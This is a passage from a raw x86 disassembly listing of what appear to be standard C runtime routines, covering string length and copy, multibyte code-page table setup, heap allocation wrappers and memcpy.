  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
